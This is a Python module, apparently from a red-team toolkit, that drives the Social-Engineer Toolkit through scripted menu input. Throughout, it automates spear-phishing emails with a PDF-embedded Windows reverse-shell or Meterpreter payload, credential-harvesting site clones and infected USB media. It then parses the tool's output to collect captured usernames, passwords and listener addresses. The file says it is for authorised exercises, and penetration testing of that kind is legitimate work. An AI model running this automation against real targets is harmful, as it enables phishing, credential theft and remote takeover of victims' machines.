#!/usr/bin/env python3
"""
Social Engineer Module — Social-Engineer Toolkit (setoolkit) automation.

Automates SET attack vectors via a generated resource script piped to
setoolkit's stdin. SET does not natively support resource files the same way
Metasploit does, so this module drives it via a menu-selection sequence
written to stdin through Popen.

Attack types supported:
  1 — Spear-phishing (email attack with malicious attachment)
  2 — Web-based attack (credential harvester, Java applet, etc.)
  3 — Infectious media (USB HID payload generation)

IMPORTANT: Social engineering attacks require physical/network access and
legal authorization. This module is for authorized red-team exercises only.
"""

import argparse
import os
import re
import tempfile
from pathlib import Path
from typing import Any

from base_module import TacticalModule


_ATTACK_TYPES = {
    1: "spear-phishing",
    2: "web-attack",
    3: "infectious-media",
}

# SET menu navigation sequences for each attack type
# These are ordered menu selections separated by newlines
_ATTACK_MENUS: dict[int, list[str]] = {
    1: [
        "1",   # Social-Engineering Attacks
        "1",   # Spear-Phishing Attack Vectors
        "2",   # Create a FileFormat Payload
        "14",  # Adobe PDF Embedded EXE Social Engineering
        "2",   # Use your own PDF for attack
        "1",   # Use metasploit built in BLANK PDF for attack
        "2",   # Windows Shell Reverse_TCP
        "4444",  # LPORT placeholder (overridden by options)
        "2",   # Windows Meterpreter Reverse_TCP
    ],
    2: [
        "1",   # Social-Engineering Attacks
        "2",   # Website Attack Vectors
        "3",   # Credential Harvester Attack Method
        "2",   # Site Cloner
    ],
    3: [
        "1",   # Social-Engineering Attacks
        "3",   # Infectious Media Generator
        "1",   # USB/CD/DVD Infectious Media
        "2",   # Windows Shell Reverse_TCP
    ],
}


class SocialEngineer(TacticalModule):
    """Automate Social-Engineer Toolkit (SET) attack vectors."""

    name: str = "social_engineer"
    description: str = (
        "Drive SET (setoolkit) via scripted stdin automation. "
        "Attack types: 1=spear-phish, 2=web-attack, 3=infectious-media. "
        "FOR AUTHORIZED USE ONLY."
    )

    def _add_module_args(self) -> None:
        """Register social engineering arguments."""
        self.parser.add_argument(
            "--attack-type",
            type=int,
            choices=[1, 2, 3],
            required=True,
            help=(
                "SET attack type: "
                "1=spear-phishing (email), "
                "2=web-attack (credential harvester), "
                "3=infectious-media (USB payload)"
            ),
        )
        self.parser.add_argument(
            "--options",
            nargs="*",
            default=[],
            metavar="KEY=VALUE",
            help="Attack options: LHOST=<ip>, LPORT=<port>, URL=<url>, EMAIL=<addr>",
        )
        self.parser.add_argument(
            "--duration",
            type=int,
            default=120,
            help="How long to run the SET session in seconds (default: 120)",
        )
        self.parser.add_argument(
            "--output-dir",
            default="/tmp/set_output",
            help="Directory to collect SET-generated files (default: /tmp/set_output)",
        )
        self.parser.add_argument(
            "--custom-menu",
            nargs="*",
            default=[],
            help="Override the menu sequence with custom selections (advanced)",
        )

    # ── Validation ───────────────────────────────────────────────────

    def _validate_args(self, args: argparse.Namespace) -> None:
        """Validate arguments and check for setoolkit availability."""
        if args.attack_type not in _ATTACK_TYPES:
            self.output_error(
                f"Invalid attack type: {args.attack_type}. Must be 1, 2, or 3."
            )

        if args.duration < 10 or args.duration > 3600:
            self.output_error(
                f"Duration must be 10–3600 seconds, got {args.duration}."
            )

        # Parse and validate options
        for opt in args.options:
            if "=" not in opt:
                self.output_error(
                    f"Invalid option format: {opt!r}. Must be KEY=VALUE."
                )
            key, value = opt.split("=", 1)
            if key == "LHOST" and value and not self.validate_ip(value):
                self.output_error(f"Invalid LHOST IP: {value!r}")
            if key == "LPORT" and value:
                try:
                    port = int(value)
                    if not self.validate_port(port):
                        self.output_error(f"Invalid LPORT: {value}. Must be 1–65535.")
                except ValueError:
                    self.output_error(f"LPORT must be an integer, got {value!r}.")

        # Ensure output dir exists or create it
        output_path = Path(args.output_dir)
        try:
            output_path.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            self.output_error(f"Cannot create output directory: {e}")

    # ── Option parsing ───────────────────────────────────────────────

    def _parse_options(self, raw_options: list[str]) -> dict[str, str]:
        """Parse KEY=VALUE option strings into a dict."""
        opts: dict[str, str] = {}
        for opt in raw_options:
            if "=" in opt:
                key, value = opt.split("=", 1)
                opts[key.upper()] = value
        return opts

    # ── Menu sequence builder ────────────────────────────────────────

    def _build_menu_sequence(
        self,
        attack_type: int,
        options: dict[str, str],
        custom_menu: list[str],
    ) -> list[str]:
        """
        Build the ordered menu selection sequence for the attack type.

        Substitutes option values (LHOST, LPORT, URL) into appropriate menu slots.
        """
        if custom_menu:
            return custom_menu

        sequence = list(_ATTACK_MENUS.get(attack_type, []))

        if attack_type == 1:  # Spear-phishing
            lhost = options.get("LHOST", "127.0.0.1")
            lport = options.get("LPORT", "4444")
            email = options.get("EMAIL", "target@example.com")
            # Insert LHOST, LPORT at positions expected by SET
            sequence.extend([
                lhost,
                lport,
                "1",   # Send email to single address
                email,
                "1",   # Use gmail
                options.get("FROM_EMAIL", "attacker@gmail.com"),
                options.get("FROM_PASS", ""),
                "1",   # Keep listener running
            ])

        elif attack_type == 2:  # Web attack
            lhost = options.get("LHOST", "127.0.0.1")
            url = options.get("URL", "https://www.example.com")
            sequence.extend([
                lhost,
                url,
            ])

        elif attack_type == 3:  # Infectious media
            lhost = options.get("LHOST", "127.0.0.1")
            lport = options.get("LPORT", "4444")
            sequence.extend([
                lhost,
                lport,
                "1",   # Windows Meterpreter Reverse_TCP
            ])

        # Always end with exit
        sequence.append("99")

        return sequence

    def _write_input_script(self, sequence: list[str]) -> str:
        """Write the menu selection sequence to a temp file. Returns file path."""
        content = "\n".join(sequence) + "\n"
        fd, tmp_path = tempfile.mkstemp(suffix=".txt", prefix="set_input_")
        with os.fdopen(fd, "w") as f:
            f.write(content)
        self.logger.info("SET input script:\n%s", content)
        return tmp_path

    # ── Setoolkit invocation ─────────────────────────────────────────

    def _build_set_args(self, input_file: str) -> list[str]:
        """Build setoolkit argument list using interactive mode via stdin."""
        # SET doesn't have a -r resource flag, so we pipe input via stdin
        # The Popen call will redirect stdin from the input file
        # We pass setoolkit with no extra args — stdin drives the menu
        return []

    # ── Output parsing ───────────────────────────────────────────────

    def _parse_set_output(self, stdout: str, stderr: str) -> dict[str, Any]:
        """Extract key events from SET output."""
        combined = stdout + "\n" + stderr
        result: dict[str, Any] = {
            "credentials_harvested": [],
            "payloads_generated": [],
            "listeners_started": [],
            "errors": [],
            "notable_events": [],
        }

        # Credential harvester: "[*] WE GOT A HIT! Printing the output:"
        cred_blocks = re.findall(
            r"WE GOT A HIT.*?Username:\s*(\S+).*?Password:\s*(\S+)",
            combined, re.IGNORECASE | re.DOTALL
        )
        for user, passwd in cred_blocks:
            result["credentials_harvested"].append({
                "username": user,
                "password": passwd,
            })

        # Generated payloads
        payload_matches = re.findall(
            r"Payload has been exported to:\s*(.+)", combined, re.IGNORECASE
        )
        result["payloads_generated"] = [p.strip() for p in payload_matches]

        # Listener info
        listener_matches = re.findall(
            r"Listener started.*?(\d+\.\d+\.\d+\.\d+):(\d+)", combined, re.IGNORECASE
        )
        for ip, port in listener_matches:
            result["listeners_started"].append({"host": ip, "port": int(port)})

        # Errors
        error_lines = re.findall(r"\[!\]\s+(.+)", combined)
        result["errors"] = [e.strip() for e in error_lines[:10]]

        # Notable events
        event_lines = re.findall(r"\[\*\]\s+(Successfully|Starting|Sending|Generated).+", combined, re.IGNORECASE)
        result["notable_events"] = [e.strip() for e in event_lines[:20]]

        result["credential_count"] = len(result["credentials_harvested"])

        return result

    def _collect_output_files(self, output_dir: str) -> list[dict[str, Any]]:
        """Collect metadata of files generated by SET in the output directory."""
        output_path = Path(output_dir)
        files: list[dict[str, Any]] = []

        # SET commonly writes to ~/.set/ — also check there
        set_dirs = [output_path, Path.home() / ".set"]

        for scan_dir in set_dirs:
            if not scan_dir.exists():
                continue
            for f in scan_dir.iterdir():
                if f.is_file():
                    stat = f.stat()
                    files.append({
                        "path": str(f),
                        "size_bytes": stat.st_size,
                        "name": f.name,
                    })

        return files

    # ── Main run ─────────────────────────────────────────────────────

    def run(self, args: argparse.Namespace) -> None:
        """Execute SET attack automation and parse results."""
        self._validate_args(args)

        options = self._parse_options(args.options)
        sequence = self._build_menu_sequence(
            args.attack_type, options, args.custom_menu
        )

        tmp_input = self._write_input_script(sequence)
        attack_name = _ATTACK_TYPES[args.attack_type]

        self.logger.info(
            "Starting SET attack type %d (%s) for %ds",
            args.attack_type, attack_name, args.duration,
        )

        try:
            import subprocess
            import signal

            # Drive SET by redirecting stdin from our input script
            with open(tmp_input) as stdin_f:
                proc = subprocess.Popen(
                    ["setoolkit"],
                    stdin=stdin_f,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    env={**os.environ, "TERM": "dumb"},
                    preexec_fn=os.setsid,
                )

            try:
                stdout, stderr = proc.communicate(timeout=args.duration)
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                try:
                    stdout, stderr = proc.communicate(timeout=5)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    stdout, stderr = proc.communicate(timeout=5)

        except FileNotFoundError:
            self.output_error(
                "setoolkit not found. Install with: apt-get install set",
                {"install_cmd": "sudo apt-get install set"},
            )
            return
        finally:
            Path(tmp_input).unlink(missing_ok=True)

        parsed = self._parse_set_output(stdout, stderr)
        output_files = self._collect_output_files(args.output_dir)

        self.output_success({
            "attack_type": args.attack_type,
            "attack_name": attack_name,
            "duration_seconds": args.duration,
            "options": options,
            "menu_sequence": sequence,
            "output_directory": args.output_dir,
            "output_files": output_files,
            "output_file_count": len(output_files),
            **parsed,
        })


if __name__ == "__main__":
    SocialEngineer().execute()
